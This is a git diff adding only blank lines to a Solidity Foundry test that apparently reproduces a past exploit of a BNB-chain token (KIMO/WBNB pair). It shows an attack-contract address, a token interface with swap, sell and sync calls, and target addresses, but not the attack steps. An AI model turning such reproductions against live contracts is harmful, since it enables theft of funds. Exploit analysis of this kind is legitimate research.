@@ -12,6 +12,7 @@ import "./../interface.sol";
 // Attack Contract: 0xb8d700f30d93fab242429245e892600dcc03935d
 
 interface IUSD {
+
     function batchToken(address[] calldata _addr, uint256[] calldata _num, address token) external;
     function swapTokensForExactTokens(
         uint256 amountIn,
@@ -24,9 +25,11 @@ interface IUSD {
     function sell(uint256) external;
     function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
     function sync() external;
+
 }
 
 contract ContractTest is Test {
+
     IPancakePair PancakePair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); // KIMO/WBNB pair
     address private usdt = 0x55d398326f99059fF775485246999027B3197955;
     address private swap = 0x5a9846062524631C01ec11684539623DAb1Fae58;
@@ -92,4 +95,5 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
